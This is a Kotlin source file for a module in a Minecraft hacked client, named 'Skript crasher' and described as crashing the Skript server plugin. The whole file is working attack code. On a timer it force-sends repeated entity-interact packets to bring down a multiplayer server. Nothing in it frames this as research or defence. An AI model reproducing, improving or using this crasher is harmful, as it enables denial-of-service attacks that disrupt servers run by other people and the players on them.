package de.florianmichael.tarasande_crasher.module

import de.florianmichael.tarasande_crasher.forcePacket
import net.minecraft.network.packet.c2s.play.PlayerInteractEntityC2SPacket
import net.minecraft.util.Hand
import net.tarasandedevelopment.tarasande.event.EventDisconnect
import net.tarasandedevelopment.tarasande.event.EventUpdate
import net.tarasandedevelopment.tarasande.mc
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module
import net.tarasandedevelopment.tarasande.util.math.TimeUtil

class ModuleSkriptCrasher : Module("Skript crasher", "Crashes the Skript plugin", "Crasher") {
    private val delay = ValueNumber(this, "Delay", 5.0, 50.0, 100.0, 5.0)

    private val timer = TimeUtil()

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }

        registerEvent(EventUpdate::class.java) {
            if (timer.hasReached(delay.value.toLong())) {
                mc.targetedEntity?.apply {
                    forcePacket(PlayerInteractEntityC2SPacket.interact(mc.targetedEntity, mc.player!!.isSneaking, Hand.MAIN_HAND))
                }
                timer.reset()
            }
        }
    }
}
